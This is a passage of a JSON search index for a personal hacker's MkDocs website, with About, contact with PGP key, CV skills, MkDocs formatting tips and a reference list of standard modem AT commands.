{"config":{"indexing":"full","lang":["sv"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"This website is my worldHQ from now. For me time is more valuable than money and I love to hack everything that you can imagine. I belive in 'hack to learn' and not 'learn to hack' I use Gentoo Linux since * 2008 and I I contribute, wirting wiki's and doing my best for give back what I got, thanks Gentooers <3 I hate politics/money, never ask me for a favor and offer money I will ignore you forever. I allways show my code and let the result talk for itself. If you interested, you will see my skills! Hobbit, Peiter Zatko, Daniel Robbins is hackers that formed my life + everyone else that supporting open source. I am a 100% non-profit hacker and if you want to donate money, please send them to GNU or Gentoo and support open source! (don't forget to mention my username, please) Thanks If you see something dangerous or what I can do better, get in touch please and we make internet to a better place!! If you help me I will help you, ezi?","title":"About"},{"location":"contact/","text":"iRC (fastest) Please, use iRC with otr or fish encryption else I will ignore you. Respect my choices and I will resepect yours. :) wuseman@Libera Mail GPG Key -----BEGIN PGP PUBLIC KEY BLOCK----- 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 CO39ZoIH3b5w =ISMl -----END PGP PUBLIC KEY BLOCK----- Telegram https://t.me/wuseman","title":"Contact"},{"location":"contact/#irc-fastest","text":"Please, use iRC with otr or fish encryption else I will ignore you. Respect my choices and I will resepect yours. :) wuseman@Libera","title":"iRC (fastest)"},{"location":"contact/#mail","text":"GPG Key -----BEGIN PGP PUBLIC KEY BLOCK----- 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 CO39ZoIH3b5w =ISMl -----END PGP PUBLIC KEY BLOCK-----","title":"Mail"},{"location":"contact/#telegram","text":"https://t.me/wuseman","title":"Telegram"},{"location":"cv/","text":"CV Personal intro wuseman is a full-time Linux Developer that working in cli as far as possible, I also control the phone via cli, which is why I spend so much time on my android wiki. Employment Depends, contact me and we can talk more Skills When you're focused on Linux you get to work with so many different technologies. Which is why I've condensed this list into the most relevant ones today, and the ones I enjoy working with Gentoo and troubleshoot and everything that you can imagine to develop myself as much as possible ``` Apache2 Android Debug Bridge Android FRP Bypassing Android Security Android Hacking Android Cracking Awk Ardunio Bash BruteForcing Curl Ch341 Firmware(FLashing/Reading/Erasing/Repacking) FT232rs GLftpd Gitlab CI/CD Github Gentoo Kernel Linux Hardware Hacking iOT Hacking Parallel Perl PHP Portage Reverse Engineering Qemu SSH Sed Syslog Wireguard Vim ...And everything you can imagine in Linux ```","title":"CV"},{"location":"cv/#cv","text":"","title":"CV"},{"location":"cv/#personal-intro","text":"wuseman is a full-time Linux Developer that working in cli as far as possible, I also control the phone via cli, which is why I spend so much time on my android wiki.","title":"Personal intro"},{"location":"cv/#employment","text":"Depends, contact me and we can talk more","title":"Employment"},{"location":"cv/#skills","text":"When you're focused on Linux you get to work with so many different technologies. Which is why I've condensed this list into the most relevant ones today, and the ones I enjoy working with Gentoo and troubleshoot and everything that you can imagine to develop myself as much as possible ``` Apache2 Android Debug Bridge Android FRP Bypassing Android Security Android Hacking Android Cracking Awk Ardunio Bash BruteForcing Curl Ch341 Firmware(FLashing/Reading/Erasing/Repacking) FT232rs GLftpd Gitlab CI/CD Github Gentoo Kernel Linux Hardware Hacking iOT Hacking Parallel Perl PHP Portage Reverse Engineering Qemu SSH Sed Syslog Wireguard Vim ...And everything you can imagine in Linux ```","title":"Skills"},{"location":"usage_notes/","text":"wuseman Reminders, example! blablabla Step 1: Emerging the new kernel sources. Step 2: Setting the right symlink to the new kernel. Step 3: Moving to the new kernel's folder. Step 4: Adjusting the .config file for the options introduced to, or removed from the new kernel's configuration. Step 5: Building the kernel and the initramfs. Step 6: Updating the bootloader. Step 7: Removing or keeping the old kernel. Update the .config file Note This is a note Warning This is a warning Critical this is dangerous.. Success this is good Bug this is a bug in kernel .... Example this is an example Quote this is quote Cite this is a cite this section .... comming soon .. title: MKDocs Tips description: My Project webpages path: docs/resources/ source: mkdocs.md MKDocs Tips n Tricks Deployment If you have a heavy website, it helps to just reload what you have edited. The reason I do this is because markdown doesn't support pymdown formats so it's difficult to see what you're actually doing if you want fancy formats. So use the following command to only reload the page you are currently editing. mkdocs serve --dirtyreload Todo I want to see if this works on a remote server. In theory, I should be able to run the following command: mkdocs serve --dirtyreload --dev-addr 3009 Then I would be able to ssh into the server: ssh erc -L 3009 :localhost:3009 Or I could use the built-in tunneling with VSCode. Extensions Admonition This is great, it allows me to add little blocks of things I find interesting. Note with title !!! note \"Title\" without title !!! note \"\" Collapsible !!! - open by default ??? - collapsible Defaults Note Button Can use note or seealso Abstract Button Can use abstract,summary,tldr Info Button Can use info,todo Fire Button tip,hint,important Checkmark Button success, check, done Question Mark question,help,faq Warning Sign warning,caution,attention X Mark failure,fail,missing Danger sign danger, error Bug sign bug Numbered List bug Quotation Marks quote, cite What Now? Question How does this work if I want to design my own symbol? Todo Design my own symbol and add it to the research notebook! CodeHilite Very simple, we have codeblocks with highlights. Using Python: import numpy as np and using Bash: echo \"Times are changing\" Colocate Different bits of Code I can also collapse them! TensorFlow PyTorch import tensorflow as tf import torch Line Numbers We can also enable line numbers with the linenums: true extension. import numpy as np import matplotlib.pyplot as plt Highlight Line Numbers import numpy as np import matplotlib.pyplot as plt from scipy import * # Don't do this!! Meta Data --- title: PyTest Tricks description: The deep learning python stack authors: - J. Emmanuel Johnson path: docs/snippets/testing source: pytest.md ---","title":"Help"},{"location":"usage_notes/#wuseman","text":"Reminders, example! blablabla Step 1: Emerging the new kernel sources. Step 2: Setting the right symlink to the new kernel. Step 3: Moving to the new kernel's folder. Step 4: Adjusting the .config file for the options introduced to, or removed from the new kernel's configuration. Step 5: Building the kernel and the initramfs. Step 6: Updating the bootloader. Step 7: Removing or keeping the old kernel.","title":"wuseman"},{"location":"usage_notes/#update-the-config-file","text":"Note This is a note Warning This is a warning Critical this is dangerous.. Success this is good Bug this is a bug in kernel .... Example this is an example Quote this is quote Cite this is a cite this section .... comming soon .. title: MKDocs Tips description: My Project webpages path: docs/resources/ source: mkdocs.md","title":"Update the .config file"},{"location":"usage_notes/#mkdocs-tips-n-tricks","text":"","title":"MKDocs Tips n Tricks"},{"location":"usage_notes/#deployment","text":"If you have a heavy website, it helps to just reload what you have edited. The reason I do this is because markdown doesn't support pymdown formats so it's difficult to see what you're actually doing if you want fancy formats. So use the following command to only reload the page you are currently editing. mkdocs serve --dirtyreload Todo I want to see if this works on a remote server. In theory, I should be able to run the following command: mkdocs serve --dirtyreload --dev-addr 3009 Then I would be able to ssh into the server: ssh erc -L 3009 :localhost:3009 Or I could use the built-in tunneling with VSCode.","title":"Deployment"},{"location":"usage_notes/#extensions","text":"","title":"Extensions"},{"location":"usage_notes/#admonition","text":"This is great, it allows me to add little blocks of things I find interesting. Note with title !!! note \"Title\" without title !!! note \"\" Collapsible !!! - open by default ??? - collapsible","title":"Admonition"},{"location":"usage_notes/#defaults","text":"Note Button Can use note or seealso Abstract Button Can use abstract,summary,tldr Info Button Can use info,todo Fire Button tip,hint,important Checkmark Button success, check, done Question Mark question,help,faq Warning Sign warning,caution,attention X Mark failure,fail,missing Danger sign danger, error Bug sign bug Numbered List bug Quotation Marks quote, cite","title":"Defaults"},{"location":"usage_notes/#what-now","text":"Question How does this work if I want to design my own symbol? Todo Design my own symbol and add it to the research notebook!","title":"What Now?"},{"location":"usage_notes/#codehilite","text":"Very simple, we have codeblocks with highlights. Using Python: import numpy as np and using Bash: echo \"Times are changing\"","title":"CodeHilite"},{"location":"usage_notes/#colocate-different-bits-of-code","text":"I can also collapse them! TensorFlow PyTorch import tensorflow as tf import torch","title":"Colocate Different bits of Code"},{"location":"usage_notes/#line-numbers","text":"We can also enable line numbers with the linenums: true extension. import numpy as np import matplotlib.pyplot as plt","title":"Line Numbers"},{"location":"usage_notes/#highlight-line-numbers","text":"import numpy as np import matplotlib.pyplot as plt from scipy import * # Don't do this!!","title":"Highlight Line Numbers"},{"location":"usage_notes/#meta-data","text":"--- title: PyTest Tricks description: The deep learning python stack authors: - J. Emmanuel Johnson path: docs/snippets/testing source: pytest.md ---","title":"Meta Data"},{"location":"android/","text":"info In this section I will keep all kind of projects that is related to android stuff","title":"info"},{"location":"android/#info","text":"In this section I will keep all kind of projects that is related to android stuff","title":"info"},{"location":"android/adb/at/","text":"Commands from the legends on below URL https://forum.xda-developers.com/t/a-sgs2-serial-how-to-talk-to-the-modem-with-at-commands.1471241/ AT+CAAP 7 .25 - Automatic answer for eMLPP Service AT+CACM 8 .25 - Accumulated call meter AT+CAEMLPP 7 .22 - eMLPP Priority Registration and Interrogation AT+CAHLD 11 .1.3 - Leave an ongoing Voice Group or Voice Broadcast Call AT+CAJOIN 11 .1.1 - Accept an incoming Voice Group or Voice Broadcast Call AT+CALA 8 .16 - Alarm AT+CALCC 11 .1.6 - List current Voice Group and Voice Broadcast Calls AT+CALD 8 .38 - Delete alarm AT+CALM 8 .20 - Alert sound mode AT+CAMM 8 .26 - Accumulated call meter maximum AT+CANCHEV 11 .1.8 - NCH Support Indication AT+CAOC 7 .16 - Advice of Charge AT+CAPD 8 .39 - Postpone or dismiss an alarm AT+CAPTT 11 .1.4 - Talker Access for Voice Group Call AT+CAREJ 11 .1.2 - Reject an incoming Voice Group or Voice Broadcast Call AT+CAULEV 11 .1.5 - Voice Group Call Uplink Status Presentation AT+CBC 8 .4 - Battery charge AT+CBCAP 8 .59 - Battery Capacity AT+CBCHG 8 .61 - Battery Charger Status AT+CBCON 8 .60 - Battery Connection Status AT+CBCS 11 .3.2 - VBS subscriptions and GId status AT+CBKLT 8 .51 - Backlight AT+CBST 6 .7 - Select bearer service type AT+CCFC 7 .11 - Call forwarding number and conditions AT+CCHC 8 .46 - Close Logical Channel AT+CCHO 8 .45 - Open Logical Channel AT+CCLK 8 .15 - Clock AT+CCUG 7 .10 - Closed user group AT+CCWA 7 .12 - Call waiting AT+CCWE 8 .28 - Call Meter maximum event AT+CDIP 7 .9 - Called line identification presentation AT+CDIS 8 .8 - Display control AT+CEAP 8 .47 - EAP authentication AT+CEER 6 .10 - Extended error report AT+CEMODE 10 .1.28 - UE modes of operation for EPS AT+CEPTT 11 .1.10 - Short Data Transmission during ongoing VGCS AT+CEREG 10 .1.22 - EPS network registration status AT+CERP 8 .48 - EAP Retrieve Parameters AT+CFCS 7 .24 - Fast call setup conditions AT+CFUN 8 .2 - Set phone functionality AT+CGACT 10 .1.10 - PDP context activate or deactivate AT+CGATT 10 .1.9 - PS attach or detach AT+CGCLASS 10 .1.17 - GPRS mobile station class AT+CGCLOSP 10 .1.13 - Configure local Octet Stream PAD parameters AT+CGCMOD 10 .1.11 - PDP Context Modify AT+CGCONTRDP 10 .1.23 - PDP Context Read Dynamic Parameters AT+CGCS 11 .3.1 - VGCS subscriptions and GId status AT+CGDATA 10 .1.12 - Enter data state AT+CGDCONT 10 .1.1 - Define PDP Context AT+CGDSCONT 10 .1.2 - Define Secondary PDP Context AT+CGEQOS 10 .1.26 - Define EPS Quality Of Service AT+CGEQOSRDP 10 .1.27 - EPS Quality Of Service Read Dynamic Parameters AT+CGEREP 10 .1.19 - Packet Domain event reporting AT+CGLA 8 .43 - Generic UICC Logical Channel access AT+CGMI 5 .1 - Request manufacturer identification AT+CGMM 5 .2 - Request model identification AT+CGMR 5 .3 - Request revision identification AT+CGREG 10 .1.20 - GPRS network registration status AT+CGSMS 10 .1.21 - Select service for MO SMS messages AT+CGSN 5 .4 - Request product serial number identification AT+CGTFT 10 .1.3 - Traffic Flow Template AT+CGTFTRDP 10 .1.25 - Traffic Flow Template Read Dynamic Parameters AT+CHLD 7 .13 - Call related supplementary services AT+CHSC 6 .15 - HSCSD current call parameters AT+CHSD 6 .12 - HSCSD device parameters AT+CHSR 6 .16 - HSCSD parameters report AT+CHST 6 .13 - HSCSD transparent call configuration AT+CHSU 6 .17 - HSCSD automatic user initiated upgrading AT+CHUP 6 .5 - Hangup call AT+CIMI 5 .6 - Request international mobile subscriber identity AT+CIND 8 .9 - Indicator control AT+CKPD 8 .7 - Keypad control AT+CLAC 8 .37 - List all available AT commands AT+CLAE 8 .31 - Language Event AT+CLAN 8 .30 - Set Language AT+CLCC 7 .18 - List current calls AT+CLCK 7 .4 - Facility lock AT+CLIP 7 .6 - Calling line identification presentation AT+CLIR 7 .7 - Calling line identification restriction AT+CLVL 8 .23 - Loudspeaker volume level AT+CMAR 8 .36 - Master Reset AT+CMEC 8 .6 - Mobile Termination control mode AT+CMEE 9 .1 - Report mobile termination error AT+CMER 8 .10 - Mobile Termination event reporting AT+CMOD 6 .4 - Call mode AT+CMOLR 8 .50 - Mobile Originated Location Request AT+CMOLRE 9 .1 - Report mobile originated location request error AT+CMOLRE 9 .3 - Mobile termination error result code AT+CMTLR 8 .57 - Mobile Terminated Location Request notification AT+CMUT 8 .24 - Mute control AT+CMUX 5 .7 - Multiplexing mode AT+CNAP 7 .30 - Calling name identification presentation AT+CNUM 7 .1 - Subscriber number AT+COLP 7 .8 - Connected line identification presentation AT+COLR 7 .31 - Connected line identification restriction status AT+COPN 7 .21 - Read operator names AT+COPS 7 .3 - PLMN selection AT+COTDI 11 .1.9 - Originator to Dispatcher Information AT+CPAS 8 .1 - Phone activity status AT+CPBF 8 .13 - Find phonebook entries AT+CPBR 8 .12 - Read phonebook entries AT+CPBS 8 .11 - Select phonebook memory storage AT+CPBW 8 .14 - Write phonebook entry AT+CPIN 8 .3 - Enter PIN AT+CPLS 7 .20 - Selection of preferred PLMN list AT+CPNET 7 .27 - Preferred network indication AT+CPNSTAT 7 .28 - Preferred network status AT+CPOL 7 .19 - Preferred PLMN list AT+CPOS 8 .55 - Positioning Control AT+CPOSR 8 .56 - Positioning Reporting AT+CPPS 7 .23 - eMLPP subscriptions AT+CPROT 8 .42 - Enter protocol mode AT+CPSB 7 .29 - Current Packet Switched Bearer AT+CPUC 8 .27 - Price per unit and currency table AT+CPWC 8 .29 - Power class AT+CPWD 7 .5 - Change password AT+CR 6 .9 - Service reporting control AT+CRC 6 .11 - Cellular result codes AT+CREG 7 .2 - Network registration AT+CRLA 8 .44 - Restricted UICC Logical Channel access AT+CRLP 6 .8 - Radio link protocol AT+CRMC 8 .34 - Ring Melody Control AT+CRMP 8 .35 - Ring Melody Playback AT+CRSL 8 .21 - Ringer sound level AT+CRSM 8 .18 - Restricted SIM access AT+CSCC 8 .19 - Secure control command AT+CSCS 5 .5 - Select TE character set AT+CSDF 6 .22 - Settings date format AT+CSGT 8 .32 - Set Greeting Text AT+CSIL 6 .23 - Silence Command AT+CSIM 8 .17 - Generic SIM access AT+CSNS 6 .19 - Single numbering scheme AT+CSQ 8 .5 - Signal quality AT+CSSAC 7 .32 - Service Specific Access Control restriction status AT+CSSN 7 .17 - Supplementary service notifications AT+CSTA 6 .1 - Select type of address AT+CSTF 6 .24 - Settings time format AT+CSVM 8 .33 - Set Voice Mail Number AT+CTFR 7 .14 - Call deflection AT+CTZR 8 .41 - Time Zone Reporting AT+CTZU 8 .40 - Automatic Time Zone Update AT+CUAD 8 .49 - UICC Application Discovery AT+CUSD 7 .15 - Unstructured supplementary service data AT+CVHU 6 .20 - Voice Hangup Control AT+CVIB 8 .22 - Vibrator mode AT+CVMOD 6 .4 - Voice Call Mode AT+FCLASS C.2.1 - Select mode AT+VBT C.2.2 - Buffer threshold setting AT+VCID C.2.3 - Calling number ID presentation AT+VGR C.2.4 - Receive gain selection AT+VGT C.2.5 - Transmit gain selection AT+VIP C.2.6 - Initialise voice parameters AT+VIT C.2.7 - Inactivity timer AT+VLS C.2.8 - Line selection AT+VRX C.2.9 - Receive data state AT+VSM C.2.10 - Select compression method AT+VTD C.2.12 - Tone duration AT+VTS C.2.11 - DTMF and tone generation AT+VTX C.2.13 - Transmit data state","title":"at-commands"},{"location":"android/adb/at/#commands-from-the-legends-on-below-url","text":"https://forum.xda-developers.com/t/a-sgs2-serial-how-to-talk-to-the-modem-with-at-commands.1471241/ AT+CAAP 7 .25 - Automatic answer for eMLPP Service AT+CACM 8 .25 - Accumulated call meter AT+CAEMLPP 7 .22 - eMLPP Priority Registration and Interrogation AT+CAHLD 11 .1.3 - Leave an ongoing Voice Group or Voice Broadcast Call AT+CAJOIN 11 .1.1 - Accept an incoming Voice Group or Voice Broadcast Call AT+CALA 8 .16 - Alarm AT+CALCC 11 .1.6 - List current Voice Group and Voice Broadcast Calls AT+CALD 8 .38 - Delete alarm AT+CALM 8 .20 - Alert sound mode AT+CAMM 8 .26 - Accumulated call meter maximum AT+CANCHEV 11 .1.8 - NCH Support Indication AT+CAOC 7 .16 - Advice of Charge AT+CAPD 8 .39 - Postpone or dismiss an alarm AT+CAPTT 11 .1.4 - Talker Access for Voice Group Call AT+CAREJ 11 .1.2 - Reject an incoming Voice Group or Voice Broadcast Call AT+CAULEV 11 .1.5 - Voice Group Call Uplink Status Presentation AT+CBC 8 .4 - Battery charge AT+CBCAP 8 .59 - Battery Capacity AT+CBCHG 8 .61 - Battery Charger Status AT+CBCON 8 .60 - Battery Connection Status AT+CBCS 11 .3.2 - VBS subscriptions and GId status AT+CBKLT 8 .51 - Backlight AT+CBST 6 .7 - Select bearer service type AT+CCFC 7 .11 - Call forwarding number and conditions AT+CCHC 8 .46 - Close Logical Channel AT+CCHO 8 .45 - Open Logical Channel AT+CCLK 8 .15 - Clock AT+CCUG 7 .10 - Closed user group AT+CCWA 7 .12 - Call waiting AT+CCWE 8 .28 - Call Meter maximum event AT+CDIP 7 .9 - Called line identification presentation AT+CDIS 8 .8 - Display control AT+CEAP 8 .47 - EAP authentication AT+CEER 6 .10 - Extended error report AT+CEMODE 10 .1.28 - UE modes of operation for EPS AT+CEPTT 11 .1.10 - Short Data Transmission during ongoing VGCS AT+CEREG 10 .1.22 - EPS network registration status AT+CERP 8 .48 - EAP Retrieve Parameters AT+CFCS 7 .24 - Fast call setup conditions AT+CFUN 8 .2 - Set phone functionality AT+CGACT 10 .1.10 - PDP context activate or deactivate AT+CGATT 10 .1.9 - PS attach or detach AT+CGCLASS 10 .1.17 - GPRS mobile station class AT+CGCLOSP 10 .1.13 - Configure local Octet Stream PAD parameters AT+CGCMOD 10 .1.11 - PDP Context Modify AT+CGCONTRDP 10 .1.23 - PDP Context Read Dynamic Parameters AT+CGCS 11 .3.1 - VGCS subscriptions and GId status AT+CGDATA 10 .1.12 - Enter data state AT+CGDCONT 10 .1.1 - Define PDP Context AT+CGDSCONT 10 .1.2 - Define Secondary PDP Context AT+CGEQOS 10 .1.26 - Define EPS Quality Of Service AT+CGEQOSRDP 10 .1.27 - EPS Quality Of Service Read Dynamic Parameters AT+CGEREP 10 .1.19 - Packet Domain event reporting AT+CGLA 8 .43 - Generic 